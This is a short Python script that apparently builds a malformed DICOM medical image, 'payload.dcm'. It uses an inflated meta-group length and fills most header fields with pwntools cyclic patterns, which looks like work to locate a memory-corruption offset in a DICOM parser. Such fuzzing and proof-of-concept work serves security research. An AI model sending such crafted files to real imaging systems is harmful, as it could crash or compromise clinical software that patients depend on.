from dicombuilder.utils import dcm_add_magic, dcm_add_header, dcm_add_element, dcm_write_file
import struct
from pwn import cyclic

buffer = b''
buffer += dcm_add_header()
buffer += dcm_add_magic()

# Size of this depends on the next meta elements.
buffer += dcm_add_element("FileMetaInformationGroupLength", 4, struct.pack("<I", 0xA600))
buffer += dcm_add_element("FileMetaInformationVersion", 2, struct.pack("<H", 0x01))
buffer += dcm_add_element("MediaStorageSOPClassUID", 28, b"1.2.840.1000o.5.1.4.1.1.12.1")
buffer += dcm_add_element("MediaStorageSOPInstanceUID", 44,
                          b"1.3.12.2.1107.5.4.3.284980.19951129.170916.9")
buffer += dcm_add_element("TransferSyntaxUID", 22, b"1.2.840.10008.1.2.4.50")
buffer += dcm_add_element("ImplementationClassUID", 22, b"1.3.12.2.1107.5.4.3.  ")
buffer += dcm_add_element("ImplementationVersionName", 16, cyclic(16))
buffer += dcm_add_element("SourceApplicationEntityTitle", 16, cyclic(16))

buffer += dcm_add_element("SpecificCharacterSet", 11, cyclic(11))
buffer += dcm_add_element("ImageType", 11, cyclic(11))
buffer += dcm_add_element("SOPClassUID", 11, cyclic(11))
buffer += dcm_add_element("SOPInstanceUID", 11, cyclic(11))
buffer += dcm_add_element("StudyDate", 8, cyclic(8))
buffer += dcm_add_element("StudyTime", 6, cyclic(6))
buffer += dcm_add_element("AccessionNumber", 11, cyclic(11))
buffer += dcm_add_element("Modality", 11, cyclic(11))
buffer += dcm_add_element("Manufacturer", 11, cyclic(11))
buffer += dcm_add_element("InstitutionName", 11, cyclic(11))

dcm_write_file(buffer, "payload.dcm")
